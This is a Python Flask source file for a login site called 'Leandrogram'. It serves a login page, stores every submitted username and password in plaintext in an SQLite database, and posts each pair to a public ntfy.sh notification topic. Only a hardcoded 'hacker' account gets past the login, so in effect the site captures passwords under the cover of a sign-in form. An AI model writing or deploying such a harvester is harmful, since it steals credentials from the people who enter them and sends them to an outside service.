

from flask import Flask, request, redirect
from datetime import datetime
import requests
import sqlite3
import os

app = Flask(__name__)

BASE = '/home/leandrogram/Leandrogram'

def iniciar_banco():
    conn = sqlite3.connect(f'{BASE}/leandrogram.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS acessos (
            id INTEGER PRIMARY KEY,
            usuario TEXT,
            senha TEXT,
            data TEXT
        )
    ''')
    conn.commit()
    conn.close()

def salvar_acesso(usuario, senha):
    conn = sqlite3.connect(f'{BASE}/leandrogram.db')
    cursor = conn.cursor()
    agora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    cursor.execute('INSERT INTO acessos (usuario, senha, data) VALUES (?, ?, ?)',
                   (usuario, senha, agora))
    conn.commit()
    conn.close()

def notificar(usuario, senha):
    requests.post(
        'https://ntfy.sh/leandrogram-leandro',
        data=f'🚨 Alguém acessou!\nUsuário: {usuario}\nSenha: {senha}'.encode('utf-8')
    )

iniciar_banco()

@app.route('/')
def login():
    return open(f'{BASE}/login.html').read()

@app.route('/entrar', methods=['POST'])
def entrar():
    usuario = request.form['usuario']
    senha = request.form['senha']
    salvar_acesso(usuario, senha)
    notificar(usuario, senha)
    if usuario == 'hacker' and senha == '123459':
        return redirect('/jornal')
    return redirect('/?erro=1')

@app.route('/jornal')
def jornal():
    return open(f'{BASE}/jornal.html').read()

@app.route('/manifest.json')
def manifest():
    return open(f'{BASE}/manifest.json').read()

@app.route('/sw.js')
def sw():
    return open(f'{BASE}/sw.js').read()

@app.route('/limpafacil')
def limpafacil():
    return open(f'{BASE}/limpafacil.html').read()

if __name__ == '__main__':
    app.run(debug=True)
